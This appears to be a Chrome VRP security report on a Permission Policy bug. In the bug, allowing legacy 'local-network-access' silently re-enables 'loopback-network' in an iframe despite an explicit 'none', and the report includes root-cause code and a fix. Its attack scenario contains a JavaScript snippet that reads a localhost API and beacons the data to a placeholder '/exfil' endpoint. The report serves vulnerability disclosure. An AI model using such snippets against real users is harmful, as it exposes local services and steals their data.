# Chrome VRP Report: Local-Network-Access Permission Policy Split Feature Bypass

## Summary

Chrome's Permission Policy implementation for Local Network Access (LNA) has a logic bug where enabling the legacy `local-network-access` feature unconditionally enables both split replacement features (`local-network` and `loopback-network`), even when those features are explicitly set to `'none'` in the container policy. This allows an embedded iframe to access loopback (localhost) resources even when the embedder explicitly restricts loopback access.

## Severity Assessment

- **Type**: Permission Policy bypass / Sandbox escape (permissions layer)
- **User Interaction**: Previously-granted LNA permission required (or user accepts prompt)
- **Preconditions**: Embedder uses mixed old+new feature names in `allow` attribute
- **Chrome Version**: All versions with `kLocalNetworkAccessChecksSplitPermissions` (enabled by default)
- **Flags Required**: None (default configuration)
- **Compromised Renderer**: Not required
- **Platform**: All platforms

## Reproduction Steps

### Setup

Site A (`https://embedder.example`) wants to embed an iframe from Site B (`https://widget.example`) and allow Site B to access local network (RFC1918 ranges) but NOT localhost/loopback.

### Embedder's intent:

```html
<!-- embedder.example -->
<iframe src="https://widget.example/app"
        allow="local-network-access; loopback-network 'none'">
</iframe>
```

The embedder intends:
- `local-network-access` → allow local network (192.168.x.x, 10.x.x.x)
- `loopback-network 'none'` → explicitly DENY loopback (127.0.0.1, localhost)

### Actual behavior:

1. The Permission Policy engine processes features iteratively in `CreateFromParentPolicy()` (`permissions_policy.cc:593`)
2. When `kLocalNetworkAccess` is processed, `InheritedValueForFeature` returns true (container policy allows it)
3. At line 627-630, `kLocalNetwork` AND `kLoopbackNetwork` are unconditionally added to `inherited_policies`:
   ```cpp
   inherited_policies.Add(
       network::mojom::PermissionsPolicyFeature::kLocalNetwork);
   inherited_policies.Add(
       network::mojom::PermissionsPolicyFeature::kLoopbackNetwork);
   ```
4. When `kLoopbackNetwork` is processed later, `InheritedValueForFeature` returns false (container says `'none'`), but `inherited_policies` is a bitset with only `Add()` — the bit is ALREADY SET and cannot be removed.

**Result**: The iframe has `loopback-network` enabled despite the explicit `'none'` restriction.

### Attack Scenario

1. `embedder.example` restricts widget's loopback access:
   ```html
   <iframe src="https://widget.example/app"
           allow="local-network-access; loopback-network 'none'">
   </iframe>
   ```

2. `widget.example/app` attempts to access `http://localhost:8080/api/data`:
   ```javascript
   fetch('http://localhost:8080/api/data')
     .then(r => r.json())
     .then(data => {
       // Access to loopback service!
       navigator.sendBeacon('https://widget.example/exfil', JSON.stringify(data));
     });
   ```

3. Browser Permission Policy check (`IsFeatureEnabled(kLoopbackNetwork)`) returns **true** (due to the bypass)

4. If the user has previously granted LNA permission to `widget.example` (or accepts the prompt), the request to localhost succeeds.

**Expected**: `IsFeatureEnabled(kLoopbackNetwork)` should return false, blocking the request before the permission prompt is even shown.

**Actual**: The Permission Policy incorrectly shows the feature as enabled, allowing the flow to proceed to the permission check.

## Technical Root Cause

`services/network/public/cpp/permissions_policy/permissions_policy.cc:623-632`:

```cpp
if (base::FeatureList::IsEnabled(
        features::kLocalNetworkAccessChecksSplitPermissions)) {
  if (feature ==
      network::mojom::PermissionsPolicyFeature::kLocalNetworkAccess) {
    inherited_policies.Add(
        network::mojom::PermissionsPolicyFeature::kLocalNetwork);
    inherited_policies.Add(
        network::mojom::PermissionsPolicyFeature::kLoopbackNetwork);
  }
}
```

The fundamental issue is that `inherited_policies` is an additive bitset computed in a single pass over all features. Once a bit is set via the legacy `local-network-access` path, it cannot be unset by a subsequent explicit `'none'` declaration for the split feature.

Feature flag: `kLocalNetworkAccessChecksSplitPermissions` is **ENABLED_BY_DEFAULT** at `services/network/public/cpp/features.cc:286`.

## Impact

### 1. Embedder's Explicit Security Policy Violated

An embedder that explicitly restricts `loopback-network` has a false sense of security. The restriction is silently ignored, and the iframe can request loopback access.

### 2. Localhost Service Exposure

If a user has previously granted LNA permission to the embedded origin (or is social-engineered into clicking "Allow"), the iframe can access localhost services:
- Local development servers (port 3000, 8080, etc.)
- Database management interfaces (phpMyAdmin, Redis commander)
- Docker/Kubernetes APIs on localhost
- Local printer/scanner interfaces

### 3. Differentiated Trust Model Undermined

The entire purpose of splitting `local-network-access` into `local-network` and `loopback-network` was to allow embedders to differentiate between "access my LAN" and "access my localhost." This bypass completely undermines that distinction.

## Suggested Fix

Compute the split-feature bits AFTER the full inherited_policies bitset is assembled, applying the split only where the specific split features were not explicitly addressed:

```cpp
// After all features are processed:
if (base::FeatureList::IsEnabled(
        features::kLocalNetworkAccessChecksSplitPermissions)) {
  if (inherited_policies.Has(kLocalNetworkAccess)) {
    // Only add split features if they weren't explicitly addressed
    if (!container_policy_explicitly_sets(kLocalNetwork)) {
      inherited_policies.Add(kLocalNetwork);
    }
    if (!container_policy_explicitly_sets(kLoopbackNetwork)) {
      inherited_policies.Add(kLoopbackNetwork);
    }
  }
}
```

Or alternatively, process explicit `'none'` declarations as removals in a second pass.

## References

- `services/network/public/cpp/permissions_policy/permissions_policy.cc:585-638` (CreateFromParentPolicy)
- `services/network/public/cpp/features.cc:286` (kLocalNetworkAccessChecksSplitPermissions ENABLED)
- Comments at lines 605-615 acknowledge the issue but dismiss it as "not supported"
- `content/browser/renderer_host/render_frame_host_impl.cc:2279-2302` (Permission check flow)
